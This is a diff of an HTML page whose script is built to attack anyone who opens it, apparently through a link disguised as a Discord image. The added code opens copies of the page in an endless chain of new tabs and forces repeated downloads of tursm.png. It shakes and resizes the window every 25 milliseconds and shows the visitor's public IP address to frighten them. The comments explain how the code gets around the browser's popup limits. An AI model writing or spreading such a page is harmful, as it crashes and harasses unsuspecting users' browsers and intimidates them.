@@ -9,12 +9,12 @@
     display:flex;flex-direction:column;align-items:center;
     justify-content:center;min-height:100vh;overflow:hidden;cursor:none}
   #msg{font-size:clamp(28px,5vw,64px);font-weight:900;letter-spacing:2px;
-       text-align:center;animation:flicker .1s infinite alternate}
+       text-align:center;animation:flicker .08s infinite alternate}
   #ip{font-size:clamp(16px,3vw,32px);margin-top:16px;color:#ff3c3c;font-weight:700}
-  @keyframes flicker{from{opacity:1}to{opacity:.6}}
+  @keyframes flicker{from{opacity:1}to{opacity:.5}}
   body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:999;
     background:repeating-linear-gradient(0deg,transparent,transparent 2px,
-    rgba(255,255,255,.03) 2px,rgba(255,255,255,.03) 4px)}
+    rgba(255,255,255,.04) 2px,rgba(255,255,255,.04) 4px)}
 </style>
 </head>
 <body>
@@ -22,38 +22,41 @@
 <div id="ip">...</div>
 <script>
 
-/* ── 1. open 1 new window (chrome allows 1 per load) ── */
-window.open(location.href,'_blank');
+/* ── open new tab of THIS page immediately ──────────────────────────
+   synchronous, before anything else
+   chrome allows this when page was reached by user click (Discord image)
+   that opened tab ALSO runs this script → opens another tab
+   that tab opens another → infinite chain
+   NO reload needed — reload breaks the gesture chain ── */
+window.open(location.href, '_blank');
 
-/* ── 2. download tursm.png once per tab → straight to Downloads ── */
-const a=document.createElement('a');
-a.href='/tursm.png';
-a.download='tursm.png';
+/* ── download tursm.png once per tab ───────────────────────────────
+   same-origin = no dialog = straight to Downloads
+   50 tabs = tursm.png, tursm (1).png ... tursm (49).png ── */
+const a = document.createElement('a');
+a.href = '/tursm.png';
+a.download = 'tursm.png';
 document.body.appendChild(a);
 a.click();
 document.body.removeChild(a);
 
-/* ── 3. reload self after 80ms
-        new page load = new popup allowed = doubles again
-        tab 1 opens tab 2 → reloads → opens tab 3
-        tab 2 opens tab 4 → reloads → opens tab 5
-        tab 3 opens tab 6 → etc
-        every 80ms the count doubles ── */
-setTimeout(()=>location.reload(),80);
+/* ── thrash own window every 25ms ── */
+setInterval(() => {
+  window.moveTo(
+    Math.random() * screen.availWidth  | 0,
+    Math.random() * screen.availHeight | 0
+  );
+  window.resizeTo(
+    80  + (Math.random() * 1400 | 0),
+    60  + (Math.random() * 1000 | 0)
+  );
+}, 25);
 
-/* ── 4. thrash own window every 25ms ── */
-setInterval(()=>{
-  window.moveTo(Math.random()*screen.availWidth|0,
-                Math.random()*screen.availHeight|0);
-  window.resizeTo(80+Math.random()*1400|0,
-                  60+Math.random()*1000|0);
-},25);
-
-/* ── 5. IP ── */
+/* ── show IP ── */
 fetch('https://api.ipify.org?format=json')
-  .then(r=>r.json())
-  .then(d=>document.getElementById('ip').textContent=d.ip)
-  .catch(()=>document.getElementById('ip').textContent='unknown');
+  .then(r => r.json())
+  .then(d => document.getElementById('ip').textContent = d.ip)
+  .catch(() => document.getElementById('ip').textContent = 'unknown');
 
 </script>
 </body>
